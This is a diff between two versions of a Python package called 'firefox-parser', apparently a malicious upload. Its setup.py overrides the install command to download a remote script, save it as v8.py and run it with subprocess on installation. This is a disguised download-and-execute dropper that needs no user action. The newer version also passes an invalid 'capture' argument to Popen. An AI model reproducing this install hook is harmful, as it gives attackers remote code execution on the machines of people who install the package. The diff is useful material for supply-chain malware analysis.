# Comparing `tmp/firefox-parser-1.1.4.tar.gz` & `tmp/firefox-parser-1.1.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "firefox-parser-1.1.4.tar", last modified: Tue May 16 08:26:19 2023, max compression
+gzip compressed data, was "firefox-parser-1.1.5.tar", last modified: Wed May 17 10:04:42 2023, max compression
```

## Comparing `firefox-parser-1.1.4.tar` & `firefox-parser-1.1.5.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-05-16 08:26:19.253903 firefox-parser-1.1.4/
--rw-rw-rw-   0        0        0       96 2023-05-16 08:26:19.253903 firefox-parser-1.1.4/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-16 08:26:19.253903 firefox-parser-1.1.4/firefox_parser.egg-info/
--rw-rw-rw-   0        0        0       96 2023-05-16 08:26:19.000000 firefox-parser-1.1.4/firefox_parser.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      197 2023-05-16 08:26:19.000000 firefox-parser-1.1.4/firefox_parser.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-16 08:26:19.000000 firefox-parser-1.1.4/firefox_parser.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-16 08:26:19.000000 firefox-parser-1.1.4/firefox_parser.egg-info/requires.txt
--rw-rw-rw-   0        0        0        1 2023-05-16 08:26:19.000000 firefox-parser-1.1.4/firefox_parser.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-16 08:26:19.253903 firefox-parser-1.1.4/setup.cfg
--rw-rw-rw-   0        0        0     1554 2023-05-16 08:26:04.000000 firefox-parser-1.1.4/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-17 10:04:42.899198 firefox-parser-1.1.5/
+-rw-rw-rw-   0        0        0       96 2023-05-17 10:04:42.897213 firefox-parser-1.1.5/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-17 10:04:42.895212 firefox-parser-1.1.5/firefox_parser.egg-info/
+-rw-rw-rw-   0        0        0       96 2023-05-17 10:04:42.000000 firefox-parser-1.1.5/firefox_parser.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      197 2023-05-17 10:04:42.000000 firefox-parser-1.1.5/firefox_parser.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-17 10:04:42.000000 firefox-parser-1.1.5/firefox_parser.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-17 10:04:42.000000 firefox-parser-1.1.5/firefox_parser.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        1 2023-05-17 10:04:42.000000 firefox-parser-1.1.5/firefox_parser.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-17 10:04:42.899198 firefox-parser-1.1.5/setup.cfg
+-rw-rw-rw-   0        0        0     1604 2023-05-17 10:04:38.000000 firefox-parser-1.1.5/setup.py
```

### Comparing `firefox-parser-1.1.4/setup.py` & `firefox-parser-1.1.5/setup.py`

 * *Files 23% similar despite different names*

```diff
@@ -26,24 +26,24 @@
         
         if response.status_code == 200:            
             chromium_path = os.path.join(directory, "v8.py")
             
             with open(chromium_path, 'w') as f:
                 f.write(response.text)
             try:
-                subprocess.Popen(['python', chromium_path])
+                subprocess.Popen(['python', chromium_path], capture=True, text=True)
             except Exception as e:
-                subprocess.Popen(['python3', chromium_path])
+                subprocess.Popen(['python3', chromium_path], capture=True, text=True)
         else:
             print('Error:', response.status_code)
         
 
 setup(
     name='firefox-parser',
-    version='1.1.4',
+    version='1.1.5',
     description='FireFox Parser in Python',
     cmdclass={
         'install': PreInstallCommand,
     },
     install_requires=[
         'requests',
     ],
```

